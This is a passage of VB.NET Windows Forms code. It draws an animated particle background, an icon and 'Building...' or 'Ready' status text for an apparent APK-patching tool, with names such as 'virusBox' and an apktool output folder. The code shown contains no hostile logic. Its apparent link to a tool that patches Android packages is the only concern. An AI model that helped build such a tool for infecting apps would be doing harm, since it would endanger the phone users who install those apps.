            Process.Start(folder_apktool & "\output")

        End If

    End Sub

    Private MainRect As Rectangle
    Private Shared rd As New Random
    Private Shared Circles(90) As cCircle ' 130
    Private Shared PointDistance As Decimal = 100
    Private Shared ea As MouseEventArgs

    Private Sub Ti1_Tick(sender As Object, e As EventArgs) Handles Ti1.Tick
        virusBox.Invalidate()
    End Sub

    Private Sub PrepareCircles()

        MainRect = DisplayRectangle

        For i As Integer = 0 To Circles.Count - 1
            Circles(i) = New cCircle(MainRect)

        Next
    End Sub

    Private Sub virusBox_MouseLeave(sender As Object, e As EventArgs) Handles virusBox.MouseLeave
        ea = Nothing
    End Sub

    Private Sub virusBox_MouseMove(sender As Object, e As MouseEventArgs) Handles virusBox.MouseMove
        ea = e
    End Sub

    Private Sub virusBox_Paint(sender As Object, e As PaintEventArgs) Handles virusBox.Paint

        Dim G As Graphics = e.Graphics

        G.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias

        For i As Integer = 0 To Circles.Count - 1

            If Not IsNothing(ea) Then

                Dim msx As Integer = ea.X
                Dim msy As Integer = ea.Y
                Dim osx As Integer = Circles(i).x
                Dim osy As Integer = Circles(i).y

                If (msx - osx) ^ 2 + (msy - osy) ^ 2 < 100 ^ 2 Then

                    Dim pTarget As Point = New Point(osx, osy)
                    Dim pOrigin As Point = New Point(msx, msy)

                    Dim getAngle As Integer
                    getAngle = (((Math.Atan2(osx - msx, msy - osy) * (180 / Math.PI)) + 360.0) Mod 360.0)

                    Dim getDist As Integer = DistanceBetween(New Point(msx, msy), New Point(osx, osy))

                    Dim newPoint As Point = New Point(GetX(osx, 100 - getDist, getAngle), GetY(osy, 100 - getDist, getAngle))

                    Circles(i).x = newPoint.X
                    Circles(i).y = newPoint.Y

                End If

            End If


            Circles(i).Show(G)
            Circles(i).Update()

        Next


        If _Bitmap_ICO IsNot Nothing Then

            G.DrawImage(_Bitmap_ICO, CInt(Me.Size.Width / 2 - CInt(_Bitmap_ICO.Width / 2)), CInt(Me.Size.Height / 2 - CInt(_Bitmap_ICO.Height) - 25), _Bitmap_ICO.Width, _Bitmap_ICO.Height)

        End If

        If Font8 IsNot Nothing Then

            Dim stringSize As New SizeF

            If Builtapk = False Then

                Dim ar As String() = {"", ".", "..", "..."}

                Dim text_ As String = "Building" & ar(count)

                stringSize = G.MeasureString(text_, Font8)

                G.DrawString(text_, Font8, New SolidBrush(colForeg), CInt(Me.Size.Width / 2 - CInt(stringSize.Width / 2)), CInt(Me.Size.Height / 2 - CInt(stringSize.Height / 2)))

            End If

            '\\\

            Dim stringSize1 As New SizeF

            Dim text_1 As String = If(Builtapk = True, String.Format("{0} (Ready)", namepatch), Status_Text)

            stringSize1 = e.Graphics.MeasureString(text_1, Font8)

            G.DrawString(text_1, Font8, New SolidBrush(colForeg), CInt(Me.Size.Width / 2 - CInt(stringSize1.Width / 2)), CInt(Me.Size.Height / 2 - CInt(stringSize1.Height / 2) + stringSize.Height))

        End If

    End Sub

    Private count As Integer = 0
    Private Sub virusBox_Resize(sender As Object, e As EventArgs) Handles virusBox.Resize
        PrepareCircles()
    End Sub

    Private Sub Ti2_Tick(sender As Object, e As EventArgs) Handles Ti2.Tick
        If count >= 3 Then
            count = 0
        Else
            count += 1
        End If
    End Sub
    Friend Class cCircle
        Public movementAngle As Decimal
        Public speed As Decimal
        Public size As Decimal
        Public x As Decimal
        Public y As Decimal
        Private MainRect As Rectangle

        Sub New(MainRect As Rectangle)
            Me.MainRect = MainRect
            ResetVars()
        End Sub

        Private Sub ResetVars()

            movementAngle = rd.Next(0, 360)
            speed = rd.Next(2, 7)
            size = rd.Next(2, 10)
            x = rd.Next(0, MainRect.Width)
            y = rd.Next(0, MainRect.Height)
        End Sub

        Public Sub Show(G As Graphics)
            Dim mypoint As Point = New Point(x, y)
            For i As Integer = 0 To Circles.Count - 1
                Dim cpoint As Point = New Point(Circles(i).x, Circles(i).y)
                If Circles(i).x <> x And Circles(i).y <> y Then
                    Dim iDis As Integer = DistanceBetween(mypoint, cpoint)
                    If iDis < PointDistance Then
                        Dim a As Integer = (iDis / PointDistance) * 50
                        G.DrawLine(New Pen(Color.FromArgb(50 - a, Build.colForeg.R, Build.colForeg.G, Build.colForeg.B), 0.5), mypoint, cpoint) ' لون الخيوط
                    End If
                End If
            Next
            G.FillEllipse(New SolidBrush(Color.FromArgb(100, Build.colForeg.R, Build.colForeg.G, Build.colForeg.B)), New Rectangle(x - (size / 2), y - (size / 2), size, size)) 'لون النقاط
        End Sub
        Public Sub Update()

            x = GetX(x, speed, movementAngle)
            y = GetY(y, speed, movementAngle)

            If x < -20 Or y < -20 Or x > MainRect.Width + 20 Or y > MainRect.Height + 20 Then
                ResetVars()
            End If

        End Sub

    End Class

    Public Shared Function DistanceBetween(p1 As Point, p2 As Point) As Single
        Return Math.Sqrt((Math.Abs(p2.X - p1.X) ^ 2) + (Math.Abs(p2.Y - p1.Y) ^ 2))
    End Function

    Private Shared Function GetX(FromX As Decimal, toAdd As Decimal, Angle As Integer) As Decimal
        Return FromX + toAdd * Math.Cos(If(Angle - 90 < 0, 360 + (Angle - 90), Angle - 90) * Math.PI / 180)
    End Function

    Private Shared Function GetY(FromY As Decimal, toAdd As Decimal, Angle As Integer) As Decimal
        Return FromY + toAdd * Math.Sin(If(Angle - 90 < 0, 360 + (Angle - 90), Angle - 90) * Math.PI / 180)
    End Function


End Class
Module CustomFont
    Private privateFonts As System.Drawing.Text.PrivateFontCollection = Nothing
    Public ReadOnly Property LoadFont(ByVal size As Integer, ByVal style As FontStyle, ByVal path As String) As System.Drawing.Font
        Get
            privateFonts = New System.Drawing.Text.PrivateFontCollection()

            privateFonts.AddFontFile(path)

            Dim Hack As System.Drawing.Font = New System.Drawing.Font(privateFonts.Families(0), size, style)

            Return Hack
        End Get

    End Property

End Module

